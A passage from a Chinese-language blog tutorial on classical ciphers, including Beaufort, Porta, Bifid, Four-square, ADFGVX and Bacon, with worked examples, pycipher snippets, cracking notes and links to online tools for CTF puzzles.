</code></pre><p>将明文转换成可读句子：</p><p>despite being more secure than the vigenere cipher the autokey cipher is still very easy to break using automated methods</p><hr><h4 id="12-博福特密码"><a href="#12-博福特密码" class="headerlink" title="12.博福特密码"></a>12.博福特密码</h4><p><strong>（1）介绍</strong></p><p>博福特密码(Beaufort Cipher)，是一种类似于维吉尼亚密码的代换密码，由弗朗西斯·蒲福(Francis Beaufort)发明。它最知名的应用是Hagelin M-209密码机。博福特密码属于对等加密，即加密演算法与解密演算法相同。</p><p>明文：<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p><p>密钥(循环使用，密钥越长相对破解难度越大)：<code>CULTURE</code></p><p>加密过程：如果第一行为明文字母，第一列为密文字母，那么沿明文字母’T’列出现密钥字母’C’的行号就是密文字母’J’，以此类推。</p><p>密文：<code>JNH DAJCS TUFYE ZOX CZICM OZHC BKA RUMV RDY</code></p><p><strong>（2）已知密钥加解密</strong></p><pre><code>&gt;&gt;&gt;from pycipher import Beaufort
&gt;&gt;&gt;Beaufort(&apos;CULTURE&apos;).encipher(&apos;THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG&apos;)
&apos;JNHDAJCSTUFYEZOXCZICMOZHCBKARUMVRDY&apos;
&gt;&gt;&gt;Beaufort(&apos;CULTURE&apos;).decipher(&apos;JNHDAJCSTUFYEZOXCZICMOZHCBKARUMVRDY&apos;)
&apos;THEQUICKBROWNFOXJUMPSOVERTHELAZYDOG&apos;
</code></pre><p>在线加解密<a href="http://www.practicalcryptography.com/ciphers/classical-era/beaufort/" target="_blank" rel="external">传送门</a></p><hr><h4 id="13-滚动密钥密码"><a href="#13-滚动密钥密码" class="headerlink" title="13.滚动密钥密码"></a>13.滚动密钥密码</h4><p><strong>（1）介绍</strong></p><p>滚动密钥密码(Running Key Cipher)和维吉尼亚密码有着相同的加密机制，区别是密钥的选取，维吉尼亚使用的密钥简短，而且重复循环使用，与之相反，滚动密钥密码使用很长的密钥，比如引用一本书作为密钥。这样做的目的是不重复循环使用密钥，使密文更难破译，尽管如此，滚动密钥密码还是可以被攻破，因为有关于密钥和明文的统计分析模式可供利用，如果滚动密钥密码使用统计上的随机密钥来源，那么理论上是不可破译的，因为任何可能都可以成为密钥，并且所有的可能性都是相等的。</p><p>明文：<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p><p>密钥：选取C语言编程(1978版)第63页第1行”errors can occur in several places. A label has…”，去掉非字母部分作为密钥(实际选取的密钥很长，长度至少不小于明文长度)。</p><p>加密过程：加密过程和维吉尼亚密码加密过程相同</p><p>密文:<code>XYV ELAEK OFQYH WWK BYHTJ OGTC TJI DAK YESR</code></p><p>已知密钥在线加解密<a href="http://www.practicalcryptography.com/ciphers/classical-era/running-key/" target="_blank" rel="external">传送门</a></p><hr><h4 id="14-Porta密码"><a href="#14-Porta密码" class="headerlink" title="14.Porta密码"></a>14.Porta密码</h4><p><strong>（1）介绍</strong></p><p>Porta密码(Porta Cipher)是一个由意大利那不勒斯的医生Giovanni Battista della Porta发明的多表代换密码，Porta密码具有加密解密过程的是相同的特点。</p><p>密表：</p><pre><code>KEYS| A B C D E F G H I J K L M N O P Q R S T U V W X Y Z
----|----------------------------------------------------
A,B | N O P Q R S T U V W X Y Z A B C D E F G H I J K L M
C,D | O P Q R S T U V W X Y Z N M A B C D E F G H I J K L
E,F | P Q R S T U V W X Y Z N O L M A B C D E F G H I J K
G,H | Q R S T U V W X Y Z N O P K L M A B C D E F G H I J
I,J | R S T U V W X Y Z N O P Q J K L M A B C D E F G H I
K,L | S T U V W X Y Z N O P Q R I J K L M A B C D E F G H
M,N | T U V W X Y Z N O P Q R S H I J K L M A B C D E F G
O,P | U V W X Y Z N O P Q R S T G H I J K L M A B C D E F
Q,R | V W X Y Z N O P Q R S T U F G H I J K L M A B C D E
S,T | W X Y Z N O P Q R S T U V E F G H I J K L M A B C D
U,V | X Y Z N O P Q R S T U V W D E F G H I J K L M A B C
W,X | Y Z N O P Q R S T U V W X C D E F G H I J K L M A B
Y,Z | Z N O P Q R S T U V W X Y B C D E F G H I J K L M A
</code></pre><p>明文：<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p><p>密钥(循环使用，密钥越长相对破解难度越大)：<code>CULTURE</code></p><p>加密过程：明文字母’T’列与密钥字母’C’行交点就是密文字母’F’,以此类推。</p><p>密文：<code>FRW HKQRY YMFMF UAA OLWHD ALWI JPT ZXHC NGV</code></p><p>已知密钥在线加解密<a href="http://www.practicalcryptography.com/ciphers/classical-era/porta/" target="_blank" rel="external">传送门</a></p><p><strong>（2）破解</strong></p><p>Porta密码可以被以<a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-vigenere-cipher-part-2/" target="_blank" rel="external">维吉尼亚密码</a>破解相类似方式进行自动攻破，破解Porta密码第一步是先确定密钥长度，这里推荐一篇关于使用<a href="https://en.wikipedia.org/wiki/Index_of_coincidence" target="_blank" rel="external">重合指数算法</a>确定为维吉尼亚密钥长度<a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-vigenere-cipher/" target="_blank" rel="external">文章</a>。</p><hr><h4 id="15-同音替换密码"><a href="#15-同音替换密码" class="headerlink" title="15.同音替换密码"></a>15.同音替换密码</h4><p><strong>（1）介绍</strong></p><p>同音替换密码(Homophonic Substitution Cipher)是单字母可以被其他几种密文字母同时替换的密码，通常要比标准替换密码破解更加困难，破解标准替换密码最简单的方法就是分析字母出现频率，通常在英语中字母’E’(或’T’)出现的频率是最高的，如果我们允许字母’E’可以同时被3种不同字符代替，那么就不能还是以普通字母的频率来分析破解，如果允许可代替字符越多，那么密文就会更难破译。</p><p>常见代换规则表：</p><p><img src="http://img1.tuicool.com/Uniaean.png" alt="同音替换密码.png"></p><p>明文:<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p><p>密文(其中一种)：<code>6CZ KOVST XJ0MA EQY IOGL4 0W1J UC7 P9NB F0H</code></p><p><strong>（2）破解</strong></p><p>如果同音替换密码的同音词个数很多，那么破解它难度很大，通常的方法采取类似破解替换密码的”爬山算法”，除了找到一个明文字母映射几个字符之外，我们还需要确定映射了那些字符，可以尝试<a href="http://www.cs.sjsu.edu/faculty/stamp/RUA/homophonic.pdf" target="_blank" rel="external">2层嵌套”爬山算法”</a>来破解，外层确定映射的数量，内层确定映射字符。</p><hr><h4 id="16-仿射密码"><a href="#16-仿射密码" class="headerlink" title="16.仿射密码"></a>16.仿射密码</h4><p><strong>（1）介绍</strong></p><p>仿射密码(Affine Cipher)是一种单表代换密码，字母表中的每个字母相应的值使用一个简单的数学函数映射到对应的数值，再把对应数值转换成字母。这个公式意味着每个字母加密都会返回一个相同的字母，意义着这种加密方式本质上是一种标准替代密码。因此，它具有所有替代密码的弱点。每一个字母都是通过函数（ax + b）mod m加密，其中B是位移量，为了保证仿射密码的可逆性，a和m需要满足gcd(a , m)=1，一般m为设置为26。更多<a href="https://en.wikipedia.org/wiki/Affine_cipher" target="_blank" rel="external">参考</a></p><p>常见的字母对应关系：</p><p><img src="http://img0.tuicool.com/UriIrq7.png" alt="常见的字母对应关系.png"></p><p>下面我们以E(x) = (5x + 8) mod 26函数为例子</p><p><img src="http://img1.tuicool.com/73mmmiq.png" alt="仿射密码.png"></p><p>至于解密我们知道</p><p><img src="http://img1.tuicool.com/fMBVze6.png" alt="仿射密码解密1.png"></p><p><img src="http://img1.tuicool.com/byYzUj2.png" alt="仿射密码解密2.png"></p><p>即可得出解密结果</p><p><img src="https://www.hackfun.org/usr/uploads/2016/07/2787731818.png" alt="仿射密码解密结果.png"></p><p>以E(x) = (5x + 8) mod 26加密，通过计算可得D(x)=21(x - 8) mod 26，这样便可以得到明文。</p><p>可参考的Python脚本</p><p><img src="http://img1.tuicool.com/J3uY32a.png" alt="仿射密码解密脚本.png"></p><p>加解密<a href="http://www.practicalcryptography.com/ciphers/classical-era/affine/" target="_blank" rel="external">传送门</a></p><hr><h4 id="17-培根密码"><a href="#17-培根密码" class="headerlink" title="17.培根密码"></a>17.培根密码</h4><p><strong>（1）介绍</strong></p><p>培根密码(Baconian Cipher)是一种替换密码，每个明文字母被一个由5字符组成的序列替换，最初的加密方式就是由’A’和’B’组成序列替换明文(所以你当然也可以用别的字母)，比如字母’D’替换成”aaabb”，以下是全部的对应关系(另一种对于关系是每个字母都有唯一对应序列，I和J与U/V各自都有不同对应序列)：</p><pre><code>A = aaaaa  I/J = abaaa  R = baaaa

B = aaaab  K = abaab    S = baaab

C = aaaba  L = ababa    T = baaba

D = aaabb  M = ababb    U/V = baabb

E = aabaa  N = abbaa    W = babaa

F = aabab  O = abbab    X = babab

G = aabba  P = abbba    Y = babba

H = aabbb  Q = abbbb    Z = babbb
</code></pre><p>明文：<code>T H E F O X</code></p><p>密文：<code>baaba aabbb aabaa aabab abbab babab</code></p><p>加解密<a href="http://rumkin.com/tools/cipher/baconian.php" target="_blank" rel="external">传送门</a></p><hr><h4 id="18-ADFGX和ADFGVX密码"><a href="#18-ADFGX和ADFGVX密码" class="headerlink" title="18.ADFGX和ADFGVX密码"></a>18.ADFGX和ADFGVX密码</h4><p><strong>（1）ADFGX密码</strong></p><p>ADFGX密码(ADFGX Cipher)是结合了改良过的Polybius方格替代密码与单行换位密码的矩阵加密密码，使用了5个合理的密文字母：A，D，F，G，X，这些字母之所以这样选择是因为当转译成摩尔斯电码(ADFGX密码是德国军队在一战发明使用的密码)不易混淆，目的是尽可能减少转译过程的操作错误。</p><p>加密矩阵示例：</p><pre><code>    A  D  F  G   X
  ----------------
A | p  h  q  g   m 
D | e  a  y  n   o 
F | f  d  x  k   r
G | c  v  s  z   w 
X | b  u  t  i/j l
</code></pre><p>明文：<code>THE QUICK BROWN FOX</code></p><p>结果矩阵加密：</p><pre><code>XF AD DA   AF XD XG GA FG   XA FX DX GX DG   FA DX FF 
</code></pre><p>列移位密钥：<code>how are u</code></p><p><img src="http://img0.tuicool.com/bqArYz6.png" alt="ADFGX密码.png"></p><p>密文：<code>DXADF AGXF XFFXD FXGGX DGFG AADA ADXXF</code></p><p>已知密钥加解密：</p><pre><code>&gt;&gt;&gt;from pycipher import ADFGX
&gt;&gt;&gt;a = ADFGX(&apos;phqgmeaynofdxkrcvszwbutil&apos;,&apos;HOWAREU&apos;)
&gt;&gt;&gt;a.encipher(&apos;THE QUICK BROWN FOX&apos;)
&apos;DXADFAGXFXFFXDFXGGXDGFGAADAADXXF&apos;
&gt;&gt;&gt;a.decipher(&apos;DXADFAGXFXFFXDFXGGXDGFGAADAADXXF&apos;)
&apos;THEQUICKBROWNFOX&apos;
</code></pre><p>在线加解密<a href="http://www.practicalcryptography.com/ciphers/adfgx-cipher/" target="_blank" rel="external">传送门</a></p><p><strong>（2）ADFGVX密码</strong></p><p>ADFGVX密码实际上就是ADFGX密码的扩充升级版，一样具有ADFGX密码相同的特点，加密过程也类似，不同的是密文字母增加了V，使得可以再使用10数字来替换明文。</p><pre><code>    A D F G V X
  -------------
A | p h 0 q g 6
D | 4 m e a 1 y
F | l 2 n o f d
G | x k r 3 c v
V | s 5 z w 7 b
X | j 9 u t i 8
</code></pre><p>由于两种加密过程完全类似这里就不再重复给出加密过程。</p><pre><code>&gt;&gt;&gt;from pycipher import ADFGVX
&gt;&gt;&gt;a = ADFGVX(&apos;ph0qg64mea1yl2nofdxkr3cvs5zw7bj9uti8&apos;,&apos;HOWAREU&apos;)
&gt;&gt;&gt;a.encipher(&apos;THE QUICK BROWN FOX&apos;)
&apos;DXXFAFGFFXGGGFGXDVGDVGFAVFVAFVGG&apos;
&gt;&gt;&gt;a.decipher(&apos;DXXFAFGFFXGGGFGXDVGDVGFAVFVAFVGG&apos;)
&apos;THEQUICKBROWNFOX&apos;
</code></pre><hr><h4 id="19-双密码"><a href="#19-双密码" class="headerlink" title="19.双密码"></a>19.双密码</h4><p><strong>（1）双密码</strong></p><p>双密码(Bifid Cipher)结合了波利比奥斯方阵换位密码，并采用分级实现扩散，这里的“双”是指用2个密钥进行加密。双密码是由法国Felix Delastelle发明，除此之外Felix Delastelle还发明了三分密码(Trifid Cipher)，四方密码(Four-Square Cipher)。还有一个<a href="https://en.wikipedia.org/wiki/Two-square_cipher" target="_blank" rel="external">两方密码</a>(Two-Square)与四方密码类似，<a href="http://www.thonky.com/kryptos/cm-bifid-cipher" target="_blank" rel="external">共轭矩阵双密码</a>(Conjugated Matrix Bifid Cipher)也是双密码的变种。</p><p>示例密阵:</p><pre><code>   1 2 3 4 5
1| p h q g m
2| e a y l n
3| o f d x k
4| r c v s z
5| w b u t i/j
</code></pre><p>明文:<code>THE QUICK BROWN FOX</code></p><p>经过密阵转换：</p><p>行:<code>512 15543 54352 333</code></p><p>列:<code>421 33525 21115 214</code></p><p>分组:</p><p><code>51215 54354 35233 3</code></p><p><code>42133 52521 11521 4</code></p><p>合并：</p><pre><code>5121542133 5435452521 3523311521 34
</code></pre><p>在经过密阵转换后密文:<code>WETED TKZNE KYOME X</code></p><p><strong>（2）已知密阵加解密</strong></p><pre><code>&gt;&gt;&gt;from pycipher import
&gt;&gt;&gt;Bifid(&apos;phqgmeaylnofdxkrcvszwbuti&apos;,5).encipher(&apos;THE QUICK BROWN FOX&apos;)
&apos;WETEDTKZNEKYOMEX&apos;
&gt;&gt;&gt;Bifid(&apos;phqgmeaylnofdxkrcvszwbuti&apos;,5).decipher(&apos;WETEDTKZNEKYOMEX&apos;)
&apos;THEQUICKBROWNFOX&apos;
</code></pre><p>在线加解密<a href="http://www.practicalcryptography.com/ciphers/classical-era/bifid/" target="_blank" rel="external">传送门</a></p><p><strong>（3）未知密阵破解</strong></p><p>手工分析破解双密码是有一定难度的，每个字母都是同过3个数字进行非线性代替转换，而且之后还会对字母顺序进行打乱，这样使双密码比一些替换密码和换位密码更难破解。然而，现在是计算机时代，这张加密方式没有安全性可言，通过<a href="http://baike.baidu.com/link?url=mkceUr0W4L7B7UVQxc-dUkXKPJbj9v4YyBh_hrskt5iXk99UdnjW6mZ_YxoJO1PkT1zdjEZD2hd7TCMiSxpOma" target="_blank" rel="external">模拟退火</a>算法就能快速找到双密码的密阵。<br>这里推荐一篇详细的<a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-bifid-cipher/" target="_blank" rel="external">双密码破解分析</a>的文章，基于模拟退火算法实现的工具破解示例：</p><p>密文:</p><pre><code>KWTAZQLAWWZCPONIVBTTBVQUZUGRNHAYIYGIAAYURCUQLDFTYVHTNQEENUPAIFCUNQTNGITEFUSHFDWHRIFSVTBISYDHHASQSROMUEVPQHHCCRBYTQBHWYRRHTEPEKHOBFSZUQBTSYRSQUDCSAOVUUGXOAUYWHPGAYHDNKEZPFKKWRIEHDWPEIOTBKESYETPBPOGTHQSPUMDOVUEQAUPCPFCQHRPHSOPQRSSLPEVWNIQDIOTSQESDHURIEREN
</code></pre><p>解密：</p><p><img src="http://img0.tuicool.com/NJVB7jY.png" alt="双密码解密.png"></p><p>得到加密矩阵:</p><pre><code>G B C M K
D H U E T
L V Y W I
X O Z S P
N F A R Q
</code></pre><p>明文:</p><pre><code>CRYPTANALYS IS OF BIFID BY HAND IS ACTUALLY FAIRLY DIFFICULT THE FRACTIONATING NATURE OF THE CIPHER IE EACH LETTER IS SUBSTITUTED BY CHARACTERS THEN THESE CHARACTERS ARE IUM BLED WHICH WILL PULL THEM APART MAKES THE CIPHER MUCH STRONGER THAN SUBSTITUTION CIPHERS OR TRANSPOSITION CIPHER SON THEIR OWN
</code></pre><hr><h4 id="20-三分密码"><a href="#20-三分密码" class="headerlink" title="20.三分密码"></a>20.三分密码</h4><p>三分密码(Trifid Cipher)结合换位和替换，三分密码与双密码非常相似，差别之处就是用除了3×3×3的密阵代替5×5密阵。</p><p>示例密阵:</p><pre><code>密阵顺序 = EPSDUCVWYM.ZLKXNBTFGORIJHAQ        

方阵 1      方阵 2      方阵 3                                        
  1 2 3      1 2 3      1 2 3    
1 E P S    1 M . Z    1 F G O    
2 D U C    2 L K X    2 R I J    
3 V W Y    3 N B T    3 H A Q    
</code></pre><p>明文:<code>THE QUICK BROWN FOX.</code></p><p>经过密阵转换：</p><pre><code>T H E Q U I C K B R O W N F O X .
2 3 1 3 1 3 1 2 2 3 3 1 2 3 3 2 2
3 3 1 3 2 2 2 2 3 2 1 3 3 1 1 2 1
3 1 1 3 2 2 3 2 2 1 3 2 1 1 3 3 2
</code></pre><p>T(233)表示T在第一个方阵第三行第三列的位置</p><p>分组(分组密钥以5为例):</p><pre><code>THEQU ICKBR OWNFO X.
23131 31223 31233 22
33132 22232 13311 21
31132 23221 32113 32
</code></pre><p>合并：</p><pre><code>23131 33132 31132 31223 22232 23221 31233 13311 32113 22 21 32
</code></pre><p>在经过密阵转换后密文:</p><pre><code>231313313231132312232223223221312331331132113222132
N  O  O  N  W  G  B  X  X  L  G  H  H  W  S  K  W
</code></pre><p>想要深入了解三分密码并破解三分密码的小伙伴推荐去看LANIKI教授的一篇密码课程章节的<a href="http://www.und.nodak.edu/org/crypto/crypto/lanaki.crypt.class/lessons/lesson17.zip" target="_blank" rel="external">讲义</a>。</p><hr><h4 id="21-四方密码"><a href="#21-四方密码" class="headerlink" title="21.四方密码"></a>21.四方密码</h4><p><strong>（1）介绍</strong></p><p>四方密码(Four-Square Cipher)是类似普莱菲尔密码双字母加密密码，这样使加密效果强于其他替换密码，因为频率分析变得更加困难了。</p><p>四方密码使用4个预先设置的5×5字母矩阵，每个矩阵包括25个字母，通常字母’j’被融入到’i’中(维基百科上说’q’被忽略，不过这不重要，因为’q’和’j’都是很少出现的字母)，通常左上和右下矩阵式是标准字母排序明文矩阵，右上和左下矩阵是打乱顺序的密钥矩阵。</p><p>示例矩阵：</p><p><img src="http://img0.tuicool.com/aY3aQnI.png" alt="四方密码.png"></p><p>明文：<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p><p>整理明文(分组不够时用’X’填充)：<code>TH EQ UI CK BR OW NF OX JU MP SO VE RT HE LA ZY DO GX</code></p><p>加密过程：分别在明文矩阵中找到’TH’，分别找到他们在右上矩阵有左下矩阵的交点字母’ES’就是密文，以此类推。</p><p>密文：<code>ESZWQAFHGTDKWHRKUENYQOLMQTUNWMBPTGHQ</code></p><p><strong>（2）已知密钥矩阵加解密</strong></p><pre><code>&gt;&gt;&gt;from pycipher import Foursquare
&gt;&gt;&gt;fs = Foursquare(&apos;zgptfoihmuwdrcnykeqaxvsbl&apos;,&apos;mfnbdcrhsaxyogvituewlqzkp&apos;)
&gt;&gt;&gt;fs.encipher(&apos;THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG&apos;)
&apos;ESZWQAFHGTDKWHRKUENYQOLMQTUNWMBPTGHQ&apos;
&gt;&gt;&gt;fs.decipher(&apos;ESZWQAFHGTDKWHRKUENYQOLMQTUNWMBPTGHQ&apos;)
&apos;THEQUICKBROWNFOXJUMPSOVERTHELAZYDOG&apos;
</code></pre><p>在线加解密<a href="http://www.practicalcryptography.com/ciphers/classical-era/four-square/" target="_blank" rel="external">传送门</a></p><p><strong>（3）未知密钥矩阵破解</strong></p><p>推荐一篇关于采用<a href="http://blog.csdn.net/xianlingmao/article/details/7798647" target="_blank" rel="external">模拟退火算法</a>的<a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-foursquare-cipher/" target="_blank" rel="external">四方密码分析</a>文章，如果有足够多的密文那么四方密码可以轻易被破解，如果知道了明文和密文推出密钥是很容易的，猜测部分明文是一个有效的方法去破解四方密码，如果一部分明文已知或者可以被猜测出<br>那么我们首先要确定尽可能多可利用的密钥，然后才可以进行更多的推测或者用其他的方法破译。基于四方密码分析一文实现的<a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-foursquare-cipher/" target="_blank" rel="external">C代码</a>破解示例：</p><p>密文(密文最好在200个字符以上)：</p><p>HMMKEQESDTMDHLAWFWMNKSOSFOMRFNLWLKHNSQGGEKXEOLLVDXNRSQQGARTFKSAVNUDLFNDHESPZGQ<br>TWESAGPGSQSQSTPKUSBBQLQHESAGPGSQSQGXLNAVHTPMHMKKNYGSUGDMTPDGFNKYAVHXLWGEKRILESLZ<br>ZOFNAVIHRHRKAGHSMYUGEGNSRGAVMVOQPRLNKRXLMYLQPXILESQYBNRHRKAGKYQXDIHMPGPYOERZOLBEZ<br>LURFWLWUOLDDPNSQYAGMUQPQWESBEZVEQESDTMDBQLWDIUSHB</p><p>用法：</p><pre><code>gcc -O3 -lm foursquarecrack2.c scoreText_2.c -o fsc
./fsc
</code></pre><p>输出结果：</p><pre><code>Running foursquarecrack, this could take a few minutes... 
best score so far: -1239.505249, on iteration 1
Key: &apos;KFMLUGWSQEPOZTNRBHDAVXCIY&apos;,&apos;UGSVKFIZMOYXPQRWTHLNCABED&apos;     
plaintext: &apos;THECIPHERTEXTSQUARESCANBEGENERATEDUSINGAKEYWORDDROPPINGDUPLICAT
            ELETTERSTHENFILLTHEREMAININGSPACESWITHTHEREMAININGLETTERSOFTHEA
            LPHABETINORDERALTERNATIVELYTHECIPHERTEXTSQUARESCANBEGENERATEDCO
            MPLETELYRANDOMLYTHEFOURSQUAREALGORITHMALLOWSFORTWOSEPARATEKEYSO
            NEFOREACHOFTHETWOCIPHERTEXTMATRICESX&apos;
</code></pre><hr><h4 id="22-棋盘密码"><a href="#22-棋盘密码" class="headerlink" title="22.棋盘密码"></a>22.棋盘密码</h4><p>棋盘密码（Checkerboard Cipher)是使用一个波利比奥斯方阵和两个密钥作为密阵的替换密码，通常在波利比奥斯方阵中J字母往往被包含在I字母中。</p><p>示例密阵：</p><pre><code>   Q  U  I  C  K
  --------------
B |K  N I/J G  H
R |P  Q  R  S  T
O |O  Y  Z  U  A
W |M  X  W  V  B
N |L  F  E  D  C
</code></pre><p>经过密阵替换:</p><pre><code>明文:T  H  E  Q  U  I  C  K  B  R  O  W  N  F  O  X
密文:RK BK RU OC OC BI NK BQ WK RI OQ WI BU NU OQ WU
</code></pre><hr><h4 id="23-跨棋盘密码"><a href="#23-跨棋盘密码" class="headerlink" title="23.跨棋盘密码"></a>23.跨棋盘密码</h4><p>跨棋盘密码(Straddle Checkerboard Cipher)是一种替换密码，当这种密码在结合其他加密方式，加密效果会更好。</p><p>棋盘示例(选择3和7作为变换):</p><pre><code>   0 1 2 3 4 5 6 7 8 9
   f k m   c p d   y e
3: h b i g q r o s a z
7: l u t j n w v x    
</code></pre><p>明文: <code>T H E Q U I C K B R O W N F O X</code></p><p>经过加密棋盘替换得到密文:<code>72 30 9 34 71 32 4 1 31 35 36 75 74 0 36 77</code></p><p>当然我们还可以继续用其他的加密方式在对跨棋盘密码加密出的结果再进行加密:</p><p>示例变换密钥:83729</p><pre><code> 8372983729837298372983729837
+7230934713241313536757403677
-----------------------------
 5502817432078501808630122404
</code></pre><p>在经过棋盘转换后:</p><pre><code>5502817432078501808630122404
ppfmyk n if  pfkyfyd hkmmcfc
</code></pre><p>最终得到密文: ppfmyk n if pfkyfyd hkmmcfc</p><p>在线加解密<a href="http://www.practicalcryptography.com/ciphers/classical-era/straddle-checkerboard/" target="_blank" rel="external">传送门</a></p><hr><h4 id="24-分组摩尔斯替换密码"><a href="#24-分组摩尔斯替换密码" class="headerlink" title="24.分组摩尔斯替换密码"></a>24.分组摩尔斯替换密码</h4><p>分组摩尔斯替换密码(Fractionated Morse Cipher)首先把明文转换为莫尔斯电码，不过每个字母之间用<code>x</code>分开，每个单词用<code>xx</code>分开。然后使用密钥生成一个替换密表，这个密表包含所有<code>. - x</code>组合的情况(因为不会出现<code>xxx</code>的情况，所以一共26种组合)。</p><p>密钥:<code>MORSECODE</code></p><p>密表:</p><pre><code>MORSECDABFGHIJKLNPQTUVWXYZ
.........---------XXXXXXXX
...---XXX...---XXX...---XX
.-X.-X.-X.-X.-X.-X.-X.-X.-
</code></pre><p>说明:密表下半部分是固定的，密表的安全性以及加密效果主要取决于使用的密钥。</p><p>明文：<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p><p>(类似)摩尔斯电码:</p><pre><code>-x....x.xx--.-x..-x..x-.-.x-.-xx-...x.-.x---x.--x-.xx..-.x---x-..-xx.---x..- --x.--.x...xx---x...-x.x.-.xx-x....x.xx.-..x.-x--..x-.--xx-..x---x--.
</code></pre><p>说明:明文在转换为(类似)摩尔斯电码后进行每3个字符分组，再进行密表的查表。</p><p>密文(经过密表替换):<code>LMUWC OQVHG ZMTAK EVYSW NOYJQ NLIQB JQCDH XMDYF TWRGP FWNH</code></p><p>已知密钥在线加解密<a href="http://ruffnekk.stormloader.com/fractmorse_tool.html" target="_blank" rel="external">传送门</a></p><hr><h4 id="25-Bazeries密码"><a href="#25-Bazeries密码" class="headerlink" title="25.Bazeries密码"></a>25.Bazeries密码</h4><p>Bazeries密码(Bazeries Cipher)是换位密码和替换密码的组合，使用两个波利比奥斯方阵，一个明文字母方阵，使用一个随机的数字(一般小于1000000)的生成一个密钥矩阵同时作为第一轮明文划分分组，比如2333这个数字翻译为英文便是TWO THOUSAND THREE HUNDRED THIRTY THREE,从第一个字母T开始选取不重复的字母，之后再从字母表中按序选取没有出现的字母组成密钥矩阵。</p><p>明文:<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p><p>随机数字:<code>2333</code></p><p>明文矩阵:</p><pre><code>A  F  L  Q  V
B  G  M  R  W
C  H  N  S  X
D I/J O  T  Y
E  K  P  U  Z
</code></pre><p>示例密钥矩阵:</p><pre><code>T  W  O  H  U
S  A  N  D  R
E I/J Y  B  C
F  G  K  L  M
P  Q  V  X  Z
</code></pre><p>明文分组:</p><pre><code>2   3   3   3   2   3   3   3  2   3   3  3
TH EQU ICK BRO WN FOX JUM PSO VE RTH ELA ZYD OG
</code></pre><p>分组明文反序:</p><pre><code>HT UQE KCI ORB WN XOF MUJ OSP EV EHT ALE DYZ GO
</code></pre><p>使用密钥矩阵替换:</p><pre><code>IL XHP QEG KDS YR CKW NXG KBV PU ILD TOP FMZ AK
</code></pre><p>(比如’H’在明文矩阵对应到密钥矩阵的位置就是’I’）</p><p>已知密钥在线加解密<a href="http://ruffnekk.stormloader.com/bazeries_tool.html" target="_blank" rel="external">传送门</a></p><hr><h4 id="26-Digrafid密码"><a href="#26-Digrafid密码" class="headerlink" title="26.Digrafid密码"></a>26.Digrafid密码</h4><p>Digrafid密码(Digrafid Cipher)使用两个密钥生成分别生成类似波利比奥斯方阵的3x9方格的密表。，主要有3分组和4分组两类。</p><p>第一个方阵密钥:<code>digrafid</code></p><p>第二个方阵密钥:<code>cipher</code></p><p>密表：</p><pre><code>1 2 3 4 5 6 7 8 9
D I G R A F D B C 1 2 3
E H J L M N O P Q 4 5 6
S T U V W X Y Z # 7 8 9
                  c f s 1
                  i g t 2
                  p j u 3
                  h k v 4
                   e l w 5
                     r m x 6
                  a n y 7
                  b o z 8
                  d q # 9
</code></pre><p>明文:<code>THE QUICK BROWN FOX</code></p><p>密表转换(以4分组为例):</p><pre><code>Th Eq Ui Ck   Br Ow Nf Ox
2  1  3  9      8  7     6  7
7  5  7  2    1  6    5  6
4  9  2  4    6  5    1  6
</code></pre><p>说明:T在第一矩阵第2列，h在第二矩阵第4行，T所在的行与h所在的列相交的位置数字为7，所以Th表示为274。</p><p>转换密文:</p><pre><code>213 975 724 924   876 716 566 516
Ip  #e  Dk  Ck    Zr  Dr  Mx  Ar
</code></pre><hr><p>####27.格朗普雷密码####</p><p>格朗普雷密码(Grandpré Cipher)是替换密码的一种，一般使用8个8字母的单词横向填充8x8方阵，且第一列为一个单词，并且在方阵中26个字母都必须出现一次以上。</p><p>示例密阵:</p><p><img src="http://img1.tuicool.com/EJ7v632.jpg" alt="格朗普雷密码.jpg"></p><pre><code>明文:T  H  E  Q  U  I  C  K  B  R  O  W  N  F  O 
密文:84 27 82 41 51 66 31 36 15 71 67 73 52 34 67
</code></pre><p>说明：明文中的字母在密阵位置可能不止一个，所以加密结果可能有多种，但是不影响解密。密阵还有6x6，7x7，9x9,10x10几种。显然密阵越大每个字母被替换的情况就可能越多，那么加密效果就更好。</p><hr><h4 id="28-比尔密码"><a href="#28-比尔密码" class="headerlink" title="28.比尔密码"></a>28.比尔密码</h4><p>比尔密码(Beale ciphers)有三份密码，当然这里说的是已被破解第二份，是一种类似书密码的替换密码。</p><p><img src="http://img2.tuicool.com/fIbIBra.png" alt="比尔密码.png"></p><p>以第二密码为例，每一个数字代表美国《独立宣言》的文本中的第几个词的首字母，如1代表第1个词的首字母“w”，2代表第2个词首字母“i”。解密后的文字如下：</p><p>I have deposited in the county of Bedford…</p><p>比尔密码还有一段有趣的故事，感兴趣可以看一下比尔密码的<a href="https://zh.wikipedia.org/wiki/%E6%AF%94%E5%B0%94%E5%AF%86%E7%A0%81" target="_blank" rel="external">详细介绍</a>。</p><h4 id="29-键盘密码"><a href="#29-键盘密码" class="headerlink" title="29.键盘密码"></a>29.键盘密码</h4><p>一般用到的键盘密码就是手机键盘和电脑键盘两种，2014 0ctf比赛里Crypto类型中Classic一题就是电脑键盘密码，详细可以<a href="http://www.programlife.net/0ops-ctf-writeup.html" target="_blank" rel="external">参考</a>，另外给出另外一些<a href="http://www.secbox.cn/hacker/ctf/8078.html" target="_blank" rel="external">参考</a>情况。</p><h3 id="其他有趣的机械密码"><a href="#其他有趣的机械密码" class="headerlink" title="其他有趣的机械密码"></a>其他有趣的机械密码</h3><hr><h4 id="1-恩尼格玛密码"><a href="#1-恩尼格玛密码" class="headerlink" 